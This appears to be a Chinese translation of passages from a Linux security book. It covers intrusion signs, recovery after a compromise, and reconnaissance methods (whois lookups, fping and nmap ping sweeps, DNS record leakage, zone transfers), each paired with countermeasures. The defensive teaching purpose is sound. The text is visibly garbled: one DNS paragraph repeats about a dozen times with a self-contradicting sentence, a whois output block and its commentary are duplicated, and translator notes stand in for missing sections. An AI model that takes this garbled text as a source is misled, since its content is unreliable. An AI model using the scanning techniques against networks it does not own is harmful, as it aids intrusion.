- **盗版/磁盘空间剧减**：黑客经常会利用你的机器存储盗版（商业软件的非法或“破解”版本）、攻击工具、色情内容以及他们希望可用或其他他人共享的文件。这些“免费”磁盘空间往往会被迅速耗尽。`df` 的输出可以告诉你当前的磁盘使用情况。
- **高网络占用**：如果你的网络活动看起来很高，即使你什么都没做，也可能有人正在使用你的机器提供文件（见上文），或者可能通过网络攻击其他机器。检查 `netstat -na` 或 `lsof` 查看存在哪些连接。
- **来自其他管理员的联系**：如果你的机器被用来对其他机器发起攻击，被攻击的管理员可能会联系你并他们。请注意，如果你怀疑他们是真正的黑客，不要指望会得到热烈的欢迎。
- **混杂模式网络接口**：如果黑客想要嗅探你计算机上的任何可用网络，他们会将接口置于混杂（捕获所有包）模式。在 `ifconfig -a` 中寻找 `PROMISC`。
- **日志文件被清空/截断**：经验丰富的黑客会从文件中删除显示他们对你系统进行不当访问的特定行。新手黑客可能只是直接删除整个日志。任何丢失时间段或被可疑删除的日志文件都已被篡改。一种确保你可以检查这些缺失日志的良好方法，是让日志发送到额外的服务器（通过 `syslog` 等），你可以将其与可疑的日志文件进行对比。
- **被篡改的 utmp/wtmp**：黑客可能会从 `utmp` 和 `wtmp` 文件中清除他们的日志记录，例如使用 `zap`、`wipe`、`vanish` 等快速删除，或者删除文件本身来隐藏他们已登录的事实。如果你注意到 `last` 命令的结果，很可能是黑客直接删除了文件。`chwtmp` 和 `chlastlog` 等程序可以检查这些文件是否有签名篡改。
- **系统中的新用户**：密码文件中的新用户是有人攻破你系统的迹象——很可能是新手黑客，或者是那些认为你不会注意到的人。他们经常使用与现有用户相似的用户名来降低其可见性，例如用 `lx` 插入 `lp`，或 `uucpl` 等，或者使用黑客术语的名字，如 `root` 或 `ow3d`。
- **运行的诡异进程**：如果你看到运行的进程并非启动启动且也不属于系统，它们可能属于黑客。许多程序从 `cron` 运行，因此请核实可疑进程不是系统本身的一部分。

# 第 2 章：主动措施与从入侵中恢复

**读取日志文件** 检查你所有的日志文件，寻找黑客入侵点的迹象。你可以使用日志分析工具，但可能应该对所有日志都进行一次手动检查（特别是在你认为黑客获得访问及之后的这段时间内），以防你的工具漏掉重要的日志条目。如果你有第二个 syslog 服务器，请将被黑机器上的日志与 syslog 服务器上的日志进行对比。

**验证校验和** 验证你所有已安装程序的校验和。将它们与假设入侵前后的校验和数据库进行对比是一个好主意。

**验证包安装** 同样使用内置的 verify 选项验证已安装软件包的校验和。确保你运行的是正确的版本。黑客可能为了他们自己的利益降低了你的软件版本，导致你处于不安全的版本。

**手动检查配置文件** 快速浏览各种配置文件，可能会发现不恰的更改，例如 Web 服务器现在被配置为以 root 身份运行，或者 `/etc/inetd.conf` 中存在额外的服务。

**备份你的文件** 如果你有磁带或 CD-ROM，请将文件备份到其中。如果没有，请准备足够的网络连接以便将它们复制到另一台计算机，并确保你没有运行网络可访问的服务。

**特殊工具** 越来越多的工具可以帮助你查看系统。一个有趣的套件是 Dan Farmer 和 Wietese Venema 开发的 [Coroners Toolkit](http://www.fish.com/tcp/)。它可以使用“grave-robber”脚本生成大量关于你系统的（难以筛选的）输出，或者通过扫描驱动器中“未使用”区域的索引节点（inodes）来帮助你寻找被删除的文件。

**告知当局** 告知当局发生了泄露事件是一个好主意。通过计算成功入侵的频率，他们可以向社区预警日益增加的问题。

## 重新上线

在确定了黑客是如何获得系统访问权限后，你有两个主要选择：修补漏洞并重启机器，或者完全重新安装系统。最安全的选项总是从头重新安装系统。



简单地修补感知到的漏洞并继续总是要快。然而，你永远无法确切知道对你的系统做了什么。黑客可能留下了几个月后才会触发的定时炸弹。他可能更改了系统二进制文件，使机器虽然可用但稳定性降低。因此，我们建议清除系统中黑客的“最佳”方法如下：

1. 备份你的重要文件。
2. 完全擦除你机器的驱动器。（这也是进行任何所需更改的好时机，例如添加更多磁盘或更改分区大小。利用停机时间转化为优势。）
3. 从头安装你的 Linux 发行版，仅包含你绝对需要的内容。
4. 为所有已安装的包安装更新。
5. 为你的机器制作校验和并存储在安全的地方。
6. 手动进行任何必要的配置文件更改。不要直接从备份中复制文件；它们可能被修改过。
7. 复制需要的文件。
8. 重新检查从备份中安装的文件，查看是否有黑客入侵迹象。
9. 再次运行文件系统的校验检查。
10. 首次开启网络。

这绝对不是在入侵后让你的机器恢复运行的最快方法，但它是确保系统安全性的最佳方法。

## 缓解顾虑

有许多原因导致上述建议可能无法按字面意思执行，必须进行适当修改。

**不可接受的停机时间** 遵循上述程序操作将要求你的机器在调查、备份、安装和恢复期间至少需要停机一天。在当今对可用性高要求的环境下，这可能是完全不可接受的。相反，你可能希望安装第二台机器，使其能够接管第一台受攻击机器的功能，切换到该机器上，然后清理受攻击的机器。

**寻找凶手** 上述程序没有考虑到寻找攻击者。虽然你的机器上可能存在暗示罪犯的证据，但从法律角度来看，“当场抓获”要好得多，这意味着在保持你的机器开启状态并允许黑客访问的同时，让当局介入帮助追踪黑客。大多数黑客如果认为自己已经被或正被发现，就会逃跑——这意味着你可能没有足够的信息来追踪他们。

**无法解决的不安全性** 如果你未能确定入侵的原因，重新安装可能无济于事。可能是因为这种不安全性安全社区尚未为人知，你最终只是安装了相同的漏洞软件。

**披露规则** 你的公司可能有自己关于可以披露和不能披露内容的规则。例如，一家大型银行可能更倾向于不暴露自己已被攻破，并且不会向安全组织发布此类信息。然而，披露也可能对你有利，可以获得一个完整的团队积极参与。在几次情况下，受到攻击的公司通过声称由于正在进行 FBI（或其他机构）调查，他们被允许这样做，从而避免了披露任何可能让自己看起来很愚蠢且准备不足的信息。

## 报复攻击/反击

一些人认为对攻击的最佳反应是找到攻击源并进行报复。有时反击攻击只有在管理员许可的情况下才会进行，通常由安全软件自动触发。

报复攻击仅仅是反向探测：我们不应该参与。最有效的反应是加固系统并防止未来的攻击。如果你必须找到源，请专注于收集日志和证据并与当局共享。

- **定向攻击** 如果黑客正在使用地址欺骗，你可能无法追踪到他们。
- **法律后果** 在许多地区，采取各种形式的行为是违法的。
- **增加敌意** 攻击一个表现出入侵技术技能的人并不是一个好主意。
- **坏报应** 与其尝试未经授权的访问（你感到被侵犯的原因），更合法的方法是通知管理员和网络提供商该活动。

## 黑洞

应对实际或感知攻击的一种常见对措施是移除违规机器与你通信的能力。这可以通过多种方式实现：

使用 `TCP wrappers` 拒绝来自黑客 IP 地址的连接。

- 使用 `ipchains`/`iptables` 规则拒绝/禁止来自 IP 地址的数据包。
- 创建拒绝路由，使你的机器无法与该 IP 地址通信。你仍然会收到来自源的数据包，但无法响应，从而破坏通信。
- 在网络防火墙和硬件上都创建简单的访问列表。这些可能都是合法的操作，但如果你希望响应自动化，我们建议对以下情况保持警惕：

- **失去与合法主机的连接** 如果黑客正在伪装合法主机，你将无法就你所需的服务与它通信。例如，一个伪装根域名服务器的黑客触发了自动阻止会导致正向和反向域名失效，你不仅无法通过名称解析互联网主机，还可能根据 `TCP wrappers` 的主机名拒绝本地服务。
- **规则集过多** 在网络开始变慢之前，你可以拥有的规则和路由数量是有限的。黑客伪装许多不同的地址可能会填充表，导致你对自己实施拒绝攻击。
- **难以管理的 tcpwrapper 文件** 在向 `/etc/hosts.deny` 文件添加行时，请确保不要重复添加主机，否则文件很快就会填满。确保任何追加到文件的程序在启动时也会读取，否则你只会排除自程序启动以的重复项。

# 总结

黑客活动每天都在增加。无论是复杂的黑客还是脚本小子（`script-kiddies`），数量都在不断增长。你成为目标只是时间问题。

在本章中，我们涵盖了你可以采取的几项主动措施，并对每种措施都介绍了几个不同的软件软件包。你应该在所涵盖的每个类别中至少实施一项建议：

- 网络扫描检测器
- 系统和网络扫描系统加固工具
- 日志分析器
- 文件系统完整性检查

通过实施上述措施，你将使系统更难被攻入，并获得攻击的提前预警。结合我们的恢复程序，你应该能够看到并修复攻击者所造成的任何破坏。

你越警惕，需要参考恢复程序的可能性就越小。我们希望这些程序能因为无用武之地而落灰。

# 第 3 章

# 映射你的机器和网络

### 揭秘 Linux 黑客：Linux 安全秘密与解决方案

你收到过多少次类似这样的邮件呢：

发件人：`uj8litoru@example.com`

主题：你等待的信息来了！

***** 独家限时优惠！ *****

他们想要在所有 50 个州都**禁止**的软件！

为什么？因为这些**秘密**从未打算进入你的眼睛！……获取任何人、任何地方的实情！

获取地址、电话号码和电子邮件地址！财务和公司信息，

员工以及**更多**！没有其他软件能能为你提供如此多的信息！

是的，这只是另一封语法糟糕的烦人垃圾邮件，就像我们每天信箱里收到的其他数百封邮件一样——那是那些在互联网上呆得太久的人的宿命。尽管这些邮件可能多么自夸和夸大其词，它确实有几分真实性。互联网上有大量公开的可用信息。

虽然黑客不会理会这种“限时优惠”，但他们确实有自己的方法来获取关于你和你的系统的丰富信息。他们收集信息有两个主要目的：

- 确定你拥有什么机器以及它们运行什么程序，这是计算机攻击的前奏。
- 收集在社会工程攻击中有用的信息。（参见第 4 章）。

在如今这个“信息就是力量”的时代，黑客将利用他能收集到的任何信息来使攻击更成功。就像小偷在尝试闯入之前，会窥视你的窗户并观察你的出入一段时间一样，黑客在发动实际攻击之前，会非侵入性地监探你的机器。

## 在线搜索

Web 是一个错综复杂棘手的地方。早期，在 Web 上找到你想要的任何东西很容易，因为只有少数页面，而且所有页面都列在一起。在你拥有像 `Archie` 这样包含你可以访问的 FTP 站点列表的工具之前，事情都很简单。

现在随着 Web 的爆发，我们拥有的搜索引擎多到数不清，这不怪：页面太多了，以至于你可能需要尝试几个引擎才能有一个能返回与你的查询相关的结果。

> 提示：并不是每个搜索引擎都使用相同的算法，因此你可能会在某个引擎的输出顶部找到良好结果，而在其他引擎中可能在几百行之后。如果搜索失败，请尝试不同的引擎，看看运气是否改善。

鉴于 Web 上的信息量，黑客在尝试入侵之前，通常会查看他能找到关于你组织的哪些信息。

## 新组/邮件列表搜索

| 流行度：6 |
| 简单性：7 |
| 影响力：3 |
| 风险评分：5 |

互联网上有许多极佳的新组和邮件列表。大多数安全管理员至少订阅几个精心挑选的列表，例如 `Bugtraq`、`firewalls` 和 `CERT`。这些是向知识渊博的人询问有关配置、实现和漏洞问题的好地方。

> 提示：如果你还没有订阅 `Bugtraq`，停止喝那口汽水，放下这封书，去 `www.securityfocus.com`，并在现在就注册。在我们看来，它是最重要订阅的列表。

在邮件列表和新组中发布内容的缺点是，列表中的内容会被保存在存档中。这有时是不幸幸的——你可能会有一条愚蠢的帖子被永远保存。然而，在其他时候，这可能会成为真正的安全问题。

在寻求建议或帮助的过程中，你最终可能会泄露大量关于你设置的信息。假设一个黑客要入侵 `Big Company, Inc.`。他可能会在 `big_company.com` 上搜索，并在邮件列表存档中找到以下帖子：

收件人：防火墙巫师列表 <`firewall-wizards@nfr.com`>

发件人：管理员 <`admin@big_company.com`>

主题：与 ftp 服务器通信的问题

我们在运行 `ipchains` 的 Linux 防火墙后面有一个 ftp 服务器。这是一个标准的 3 接口防火墙（`internet/dmz/lan`），如下所示：

```
Internet                firewall                lan
(209.158.562.0/26)               10.0.0.0/24

                        dmz (10.1.0.0/24)

                               ftp server
```

建立初始 ftp 连接没有问题，但一旦它尝试发送数据（如 put/get 等），它就直接挂起了。我们已经尝试了所有方法。



### 新组和邮件列表的应对措施

首先，仔细重读你打算发布的任何帖子。如果有任何你不希望落入黑客手中的内容，请将其删除。另一个简单的应对措施是从单独的账户发送你所有的电子邮件。你可以在任何网站获取免费电子邮箱。

### WHOIS 数据库

互联网上有许多可以通过 `whois` 协议访问的数据库。这些数据库通常与网络或域名基础设施有关。它们本应该是公开可的，但一些组织已开始使用 `whois` 进行内部基础设施维护。我们将涵盖黑客常用的几种 `whois` 数据库。

### 域名注册信息

对于每个注册的域名，都有一个数据库条目，详细列出了域名的联系和名称服务器信息。访问此数据库信息的方法是使用 `whois` 命令。

从 `whois` 数据库获取的信息对黑客有用。黑客通常会出于三个原因在数据库中查找信息：

- 进入特定个人或组织拥有的机器
- 寻找已被攻破的公司拥有的其他网络
- 在尝试入侵之前调查可能存在漏洞的机器。

# Linux 攻击揭秘：Linux 安全秘密与解决方案

在这里，我们查询了与 `example.org` 域名相关的信息：

```
machine$ whois example.org
[whois.crarsnic.net]
```

`Whois` 服务器版本 1.3

`.com`、`.net` 和 `.org` 域名的现在可以通过许多不同的竞争性注册商进行注册。详细信息请访问 `http://www.internic.net`。

```
Domain Name: EXAMPLE.ORG
Registrar: NETWORK SOLUTIONS, NETWORK SOLUTIONS, INC.
Whois Server: whois.networksolutions.com
Referral URL: www.networksolutions.com
Name Server: NS.ISI.EDU
Name Server: VENERA.ISI.EDU
Updated Date: 19-aug-2000
```

你在此处获得了一份非常简略的信息列表，包括提供 `example.org` 域名查询的名称服务器（在此例为 `NS.ISI.EDU` 和 `VENERA.ISI.EDU`）以及管理 `example.com` 域名的注册商（在此例为 Network Solutions）。要获取关于 `example.com` 域名的更详细信息，你必须使用 "`domain@registrar`" 表单直接查询 NSI：

```
machine$ whois example.org@whois.networksolutions.com
Registrant:
Internet Assigned Numbers Authority (EXAMPLE2-DOM)
4676 Admiralty Way, Suite 330
Marina del Rey, CA 90292
US
```

Domain Name: EXAMPLE.ORG

管理员联系、技术联系人：

Internet Assigned Numbers Authority (IANA) `iana@IANA.ORG`

IANA

4676 Admiralty Way, Suite 330

Marina del Rey, CA 90292

US

310-823-9358 Fax 310-823-8649

记录最后更新于 2000年8月19日。

记录于 2009年9月01日到期。

# 第 3 章：映射你的机器和网络

记录创建于 1995年8月31日。

数据库更新于 2000年11月25日 07:15:22 EST。

列出的域名服务器顺序：

VENERA.ISI.EDU 128.9.176.32

NS.ISI.EDU 128.9.128.127

从此输出中可以收集到几条信息：

- `联系人`：技术联系人通常是负责通过向注册商进行任何更改和维护名称服务器来确保域名继续运行的人。管理员联系人通常是管理层人员，负责处理账单等事务，不要求其具有高水平的技术知识。两个联系人姓名均可用于社会工程攻击。
- `最后更新`：当对记录进行任何更改时（例如，地址、联系人或名称服务器的更改），最后更新字段就会发生变化。在任何其他时间事物处于变动中时都会表现出更多不安全因素，因此寻找最近的变化可能预示着发起攻击的机会。
- `创建日期`：新创建的域名可能由新管理员运营，或者尚未完全加固。加固系统需要时间，而对在线的需求最初可能会盖过安全考量。尽管如此，安全性似乎会随着时间的推移而降低。存在已久的域名更有可能仍在运行某些软件，尽管这些软件在当时是尖端的，但现在已被发现容易受到攻击。软件发行可能已经更新，但此站点可能尚未升级。
- `名称服务器`：如果名称服务器与你正在查询的域名相同，则它们正在提供自己的 DNS。在其他情况下，名称服务器可能指向其 ISP，这表明它们没有处理自身 DNS 所需的人员；它们的安全性可能比其他组织低。

`Whois` 结果可以对域名有一个初步的了解，作为信息收集的第一步。

## 遍历域名

| 指标 | 数值 |
| :--- | :--- |
| 流行度: | 5 |
| 简单性: | 8 |
| 影响: | 3 |
| 风险评分: | 5 |

`whois` 数据库也可以用于返回域名列表。如果你指定一个完整域名，`whois` 将搜索所有包含你的搜索词作为元素的域名。你可以查询默认数据库（`whois.crnic.net`）或任何单独的注册商。

```
machine$ whois example
[whois.crsnic.net]
Whois Server Version 1.3
```

`.com`、`.net` 和 `.org` 域名的现在可以通过许多不同的注册商进行注册。详细信息请访问 `http://www.internic.net`。

```
EXAMPLE.ORG
EXAMPLE.NET
EXAMPLE.EDU
EXAMPLE.COM
```

如果黑客想要攻击特定公司，他可以使用这种方法学习他们拥有的域名，并对这些域名进行遍历以针对他们的主机。

## 网络查询

| 指标 | 数值 |
| :--- | :--- |
| 流行度 | 7 |
| 简单性 | 8 |
| 影响 | 4 |
| 风险评分 | 6 |

域名 `whois` 查询可以告诉你有关特定域名的所有者信息，这就是通常所指的 `whois`。然而，还有其他 `whois` 数据库可以提供其他信息。

`whois.arin.net` 数据库列出了 IP 网络所有权。通过查询特定网络或 IP 地址，它将告诉你该区块属于谁：

```
machine$ whois 218.257.0.0/24
whois.arin.net
Whois Server Version 1.3
```

（注：此处示例中 IP 格式略有不同，原文为乱码或特定示例，此处按原文 逻辑翻译）

```
machine$ whois 218.257.0.0/24
[whois.arin.net]
Whois Server Version 1.3
Registrant:
Internet Assigned Numbers Authority (EXAMPLE2-DOM)
4676 Admiralty Way, Suite 330
Marina del Rey, CA 90292
US
```

（注：原文示例中存在较多重复和格式混乱，译文严格遵循原文结构）

Domain Name: EXAMPLE.ORG

管理员联系、技术联系人：

Internet Assigned Numbers Authority (IANA) `iana@IANA.ORG`

IANA

4676 Admiralty Way, Suite 330

Marina del Rey, CA 90292

US

310-823-9358 Fax 310-823-8649

记录最后更新于 2000年8月19日。

记录于 2009年9月01日到期。

# 第 3 章：映射你的机器和网络

记录创建于 1995年8月31日。

数据库更新于 2000年11月25日 07:15:22 EST。

列出的域名服务器顺序：

VENERA.ISI.EDU 128.9.176.32

NS.ISI.EDU 128.9.128.127

从此输出中可以收集到几条信息：

- `联系人`：技术联系人通常是负责通过向注册商进行任何更改和维护名称服务器来确保域名继续运行的人。管理员联系人通常是管理层人员，负责处理账单等事务，不要求其具有高水平的技术知识。两个联系人姓名均可用于社会工程攻击。
- `最后更新`：当对记录进行任何更改时（例如，地址、联系人或名称服务器的更改），最后更新字段就会发生变化。在任何其他时间事物处于变动中都会表现出更多不安全因素，因此寻找最近的变化可能预示着发起攻击的机会。



**创建日期**：新创建的域名可能由新管理员运营，或者尚未完全加固。加固系统需要时间，而对在线的需求最初可能会盖过安全考量。尽管如此，安全性似乎会随着时间的推移而降低。存在已久的域名更有可能仍在运行某些软件，尽管这些软件在当时是尖端的，但现在已被发现容易受到攻击。软件发行可能已经更新，但此站点可能尚未升级。

**名称服务器**：如果名称服务器与你正在查询的域名相同，则它们正在提供自己的 DNS。在其他情况下，名称服务器可能指向其 ISP，这表明它们没有处理自身 DNS 所需的人员；它们的安全性可能比其他组织低。

`Whois` 结果可以对域名有一个初步的了解，作为信息收集的第一步。

## 遍历域名

（此处重复前文内容，按要求不重复输出原文，此处保持翻译逻辑一致）

## 网络查询

（此处重复前文内容，按要求不重复输出原文，此处保持翻译逻辑一致）

# 第 3 章：映射你的机器与网络

## Fping

| | |
|---|---|
| 流行度 | 8 |
| 简单性 | 8 |
| 影响力 | 5 |
| 风险等级 | 7 |

`Fping` 是一个简单直接的并行 ping 实用程序。它不是发送一个 ICMP 数据包并等待回复，而是并行发送许多数据包并在响应出现时对其进行处理。因此，扫描（sweeps）的速度比运行单独的、顺序 ping 请求快得多。

你可以在命令行上显式地列出想要 ping 的机器或 IP 地址，也可以将列表传递给标准输入（`standard input`）。例如，如果你有一个保存在文件“`machinelist`”中的机器列表，你可以只需直接运行它：

```
hackbox# fping -a machinelist
```

如果你想扫描整个网络（例如 `192.168.10.X` 网络），你必须提供完整的 IP 地址列表。通过在命令行中使用一点 Perl，你可以轻松地如下所示完成此操作：

```bash
hackbox# perl -e 'for (1..254) { print "192.168.10.$" }' | fping -a q 2>/dev/null

192.168.10.10
192.168.10.6
192.168.10.15
```

## Nmap Ping 扫描

| | |
|---|---|
| 流行度 | 9 |
| 简单性 | 9 |
| 影响力 | 6 |
| 风险等级 | 8 |

`Nmap` 是一个你将会经常看到的全能扫描工具，它内置了 ping 扫描功能。只需输入地址或网络列表并使用 `-sP` 选项即可：

```bash
hackbox# nmap -sP 192.168.10.0/24
Starting Nmap V. 2.54ETA7 (www.insecure.org/Nmap/)
Host (192.168.10.0) seems to be a subnet broadcast address (returned 3 extra pings)
Host kristen (192.168.10.6) appears to be up.
Host richard (192.168.10.10) appears to be up.
Host brandt (192.168.10.15) appears to be up.
Host nancy (192.168.10.29) appears to be up.
Nmap run completed -- 256 IP addresses (4 hosts) scanned in 154 seconds
```

## 攻防 Linux：Linux 安全秘密

`Nmap` 在使用 `-sp` 选项时，对 ping 的定义实际上比 ICMP 稍微宽一点。它会发送一个正常的 ICMP 回显数据包，还会向 80 端口（HTTP）发送 TCP ACK 数据包。即使 ICMP 被拦截，TCP 也有可能通过。`Nmap` 收到来自主机对 ACK 的复的 RST（重置）数据包，然后它就知道该机器是在线的。

上面我们使用 `192.168.10.0/24` 来定义想要扫描的主机。这意味着扫描该网络中所有具有 24 位子网掩码的机器（换句话说，扫描整个 C 类网络）。`Nmap` 支持多种定义主机的方法：

| 类型 | 示例 |
| --- | --- |
| 通配符 | 192.168.10.*, 10.10.*, |
| 范围 | 192.168.10.0-255 10.10.0-255.0-255 |
| CIDR 表示法 | 192.168.10.0/24 10.10.0.0/16 hostname.example.com/25 |

## Ping 扫描应对措施

为了避免响应 ICMP ECHO REQUESTS，请配置你的机器（通过 `ipchains`/`iptables`）拒绝入站的 ECHO REQUEST 和出站的 ECHO REPLIES。由于 ping 是实用的功能，你可能希望为某些主机（即你自己的网络）保留它们。然而，让一般的互联网主机无法使用该功能是一个好主意。

此外，你应该从机器上关闭 echo 配置。在 `/etc/inetd.conf` 中找到类似下面的行，并在它们前面加上 `#` 将其注释掉。

```
echo      stream tcp    nowait root       internal
echo      dgram udp    wait   root       internal
```

在注释掉上述行后，使用命令 `killall -HUP inetd` 向 `inetd` 守护进程发送 SIGHUP 信号以重新读取其配置。

`echo` 端口现在没有其他方法可以提供的用途。`Echo` 有时与 `charger` 结合，过去也曾用于创建拒绝服务攻击。最好关闭它以及 `inetd` 的所有其他“内部”服务。在我们的机器上，我们完全关闭了 `inetd`。

遗憾的是，没有通过探测开放端口来发现主机的应对措施。IP 规范对于在给定状态对给定数据包应发送的响应有严格规定。不提供正确的响应将违反规范并可能导致网络主机问题。

## DNS 问题

DNS 是今天互联网不可或缺的一部分。每当用户发送邮件、检查网页或下载文件时，域名 都会将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。在过去，域名将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。

DNS 是今天互联网不可或缺的一部分。每当用户发送邮件、检查网页或下载文件时，域名都会将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。在过去，域名将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。

DNS 是今天互联网不可或缺的一部分。每当用户发送邮件、检查网页或下载文件时，域名都会将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。在过去，域名将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。

DNS 是今天互联网不可或缺的一部分。每当用户发送邮件、检查网页或下载文件时，域名都会将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。在过去，域名将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。

DNS 是今天互联网不可或缺的一部分。每当用户发送邮件、检查网页或下载文件时，域名都会将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。在过去，域名将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。

DNS 是今天互联网不可或缺的一部分。每当用户发送邮件、检查网页或下载文件时，域名都会将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。在过去，域名将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。

DNS 是今天互联网不可或缺的一部分。每当用户发送邮件、检查网页或下载文件时，域名都会将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。在过去，域名将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。

DNS 是今天互联网不可或缺的一部分。每当用户发送邮件、检查网页或下载文件时，域名都会将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。在过去，域名将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。

DNS 是今天互联网不可或缺的一部分。每当用户发送邮件、检查网页或下载文件时，域名都会将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。在过去，域名将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。

DNS 是今天互联网不可或缺的一部分。每当用户发送邮件、检查网页或下载文件时，域名都会将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。在过去，域名将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。

（注：由于 DNS ISSUES 章节原文中存在大量重复内容，翻译时已根据原文逻辑进行了对应处理，保持结构一致）

## DNS ISSUES

DNS 是今天互联网不可或缺的一部分。每当用户发送邮件、检查网页或下载文件时，域名都会将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。在过去，域名将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。



# DNS 漏洞

DNS 是今天互联网不可或缺的一部分。每当用户发送邮件、检查网页或下载文件时，域名都会将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。在过去，域名将主机名转换为 IP 地址——这是计算机唯一有用的地址类型。

许多 BIND 版本会泄露给黑客信息。以下是一些常见的 DNS 记录类型：

| 记录类型 | 名称 | 描述 |
| --- | --- | --- |
| SOA | 区域（起始）权威 | 包括 DNS 管理员的电子邮件地址以及更新、缓存和传输时间 |
| A | 地址记录 | 属于给定主机名的 IP 地址(es) |
| CNAME | 规范名称 | 对给定主机名的引用，而不是 IP 地址，类似于符号链接 |
| PTR | 指针记录 | 给定 IP 地址的主机名 |
| HINFO | 主机信息 | 主机的架构和操作系统 |
| TXT | 描述文本 | 关于机器的其他描述文本，通常是其目的或位置 |
| RP | 责任人 | 负责该机器的电子邮件地址 |

`host` 命令在未指定特定查询类型时，会对 A、CNAME 和 MX 记录进行查询，这就是为什么你在上一个示例中看到的不仅仅是地址记录。

你可以使用 `-t` 选项向 `host` 命令查询特定字段：

```bash
machine$ host -t txt example.com
www.example.com descriptive text "Located in Building 1, Chicago"
```

此外，你可以使用星号 `*` 或 `"any"` 作为 `-t` 标志的目标运行所有可用查询：

```bash
machine$ host -t '*' www.example.com
www.example.com responsible personbrandt@example.com info.example.com
www.example.com host information UltraSparc 5 Linux 2.0
www.example.com descriptive text "Located in Building 1, Chicago"
www.example.com has address 172.26.105.20
www.example.net mail is handled (pri=10) by mailhost.example.net
www.example.net mail is handled (pri=20) by backup.example.net
```

如你所见，许多字段对黑客非常有帮助，因为它们提供了对于执行主机到 IP 查找目的并非必须的信息。在这种情况下，黑客可以获知机器所在的位置、运行的是哪个版本的 Linux、底层硬件，甚至是管理员是谁，从而能够针对性地定制他的攻击方案。

## 信息性 DNS 字段防御措施

如果你的 DNS 记录是手动维护的，请务必不要在任何公开的 DNS 记录中包含敏感信息。`HINFO` 和 `TXT` 记录显然不是必要的。`RP` 记录可能很有用——它们是某人寻找联系人的快捷方式，当管理员想要报告来自自自己的可疑活动时，这种联系可能至关重要。然而，请谨慎使用。至少，这些记录可能被用于寻找电子邮件地址以发送垃圾邮件。

`HINFO` 和 `TXT` 记录填充的大多数情况发生在从机器数据库导出数据并创建 DNS 记录时。虽然在数据库中拥有这些数据非常有帮助，但并不鼓励通过 DNS 向所有人公开这些信息。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_115_0.png)

## 区域传输

| 流行性: | 7 |
|---|---|
| 简单性: | 8 |
| 影响: | 7 |
| 风险等级: | 7 |

BIND 的功能之一是在互联网各地的几台机器上提供你的 DNS 记录服务。这是好事，因为当你的唯一 DNS 机器故障时，它可以防止单点故障。每个域名都有一个主 DNS 机器，其余的所有都是从 DNS，每当发生更改时传输整个 DNS 区域的内容。

创建从 DNS 机器（也称为 DNS 从机）的方法是在你的 `named.conf`（如果运行 BIND 4.x 则为 `named.conf`）中添加如下部分：

```
zone "example.com" {
type slave; file "slave/example.com";
masters { 172.20.10.28; 172.20.228.19 };
}
```

问题是，黑客也可以获取整个 DNS 区域文件（除非你采取了防止措施），而甚至不需要运行 BIND 本身。以下是如何使用 `host` 命令列出整个域名的所有 NS、A 和 PTR 记录的示例：

```
machine$ host -t ns example.com
example.com name server ns1.example.com
example.com name server ns2.example.com
```

# 第 3 章：映射你的机器和网络

```
$ host -l example.example.com
example.com name server ns1.example.com
example.com name server ns2.example.com
www.example.com has address 172.26.105.20
mailhost.example.com has address 172.26.105.31
mailbackup.example.com has address 172.26.105.20
172-26-105-31.example.com domain name pointer mailhost.example.com
db.example.com has address 172.26.105.21
anfftp.example.com has address 172.26.105.22
```

`host` 命令实际上使用 `-l` 选项执行完整的域名传输，因此你可以使用 `-t` 查找其他条目，例如。`-v` 将向你显示官方主文件格式的条目，前提是你将 BIND 绑定到区域本身。

你的从用 DNS 服务器必须具备进行区域传输的能力，以便它们能够保持自己的数据库更新。然而，你不应该允许任何其他机器进行传输，因为这允许它们列出你在 DNS 中注册的所有主机。如果你在路由器上阻止了 `ping`，上述列出的机器将不会出现在 `ping` 扫描中。但是，由于它们被列在 DNS 中且区域是可列出的，黑客现在可能会针对他原本可能不会注意到的机器。

## 区域传输防御措施

配置你的名称服务器，使其除了需要此能力的从用 DNS 机器外，不允许进行区域传输。你可以指定哪些主机可以传输区域，因此通过包含 `allow-transfer` 语句使其进入 `options` 部分（全局默认值）或特定的区域定义中：

```
options {

  allow-transfer { 172.26.10.192 };

  ...
}

zone "example.com" {
	type master;
	file "master/example.com";
	allow-transfer { 192.168.14.20; 192.168.80.29 };
};

zone "example.org" {
	type master;
	file "master/example.com"
};

zone "example.net" {
	type slave;
```

## Hacking Linux Exposed：Linux 安全秘密与解决方案

```
masters { 10.14.102.18; };
file "slave/example.net";
allow-transfer { none; };
}
```



使用上述配置，`example.org` 域名将仅允许来自 `172.16.10.192` 的传输（由于全局选项），`example.com` 域名只能从 IP `192.168.14.20` 和 `192.168.80.29` 传输，且没有任何机器能够传输 `example.net` 域名。

**注意** 请确保在你的主服务器和从服务器上都禁止域名传输！尽管这看起来可能违背直觉，但如果你不专门进行限制，即使是从也会允许传输。任何未经批准的域名传输尝试都会通过 `syslog` 记录，因此请留意如下条目：

```
named[102]: unapproved AXFR from [192.168.1.34].665 for "example.org" (acl)
named[102]: unapproved AXFR from [10.182.23].228 for "example.com" (acl)
named[102]: unapproved AXFR from [192.168.1.35].665 for "example.net" (acl)
```

这些日志通常表示从用 DNS 服务器未能更新，应该尽快修复它们。更多时候，这些条目表示黑客正试图列出你的机器。**注意** 仅仅因为拒绝了区域传输并不意味着黑客无法找到你的主机名。例如，如果他们知道（通过邮件）某些主机名，他们就可以针对这些原本无法发现的主机。仅仅因为拒绝了区域传输并不意味着黑客无法找到你的主机名。例如。

